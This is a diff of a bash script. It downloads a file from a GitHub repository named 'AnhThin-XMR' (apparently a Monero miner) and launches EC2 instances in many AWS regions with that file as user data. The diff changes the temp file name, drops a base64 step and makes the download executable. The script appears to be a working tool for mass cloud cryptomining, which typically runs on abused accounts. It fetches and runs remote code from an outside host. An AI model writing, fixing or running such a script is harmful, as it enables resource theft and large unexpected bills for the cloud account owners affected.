@@ -11,17 +11,19 @@ declare -A region_image_map=(
 user_data_url="https://raw.githubusercontent.com/hoanglonglouis/AnhThin-XMR/main/AnhThinXmr"
 
 # Temporary file to store User Data
-user_data_file="/tmp/secrett.sh"
+user_data_file="/tmp/user_data.sh"
 
 # Download User Data from GitHub
 curl -s -L "$user_data_url" -o "$user_data_file"
+
+# Verify if user-data was downloaded successfully
 if [ ! -s "$user_data_file" ]; then
-    echo "Error: Failed to download user-data."
+    echo "Error: Failed to download user-data from GitHub."
     exit 1
 fi
 
-# Convert user-data to Base64 to avoid AWS CLI issues
-user_data_base64=$(base64 --wrap=0 "$user_data_file")
+# Make user-data executable (optional, in case it's a script)
+chmod +x "$user_data_file"
 
 # Loop through each region to deploy EC2 instances
 for region in "${!region_image_map[@]}"; do
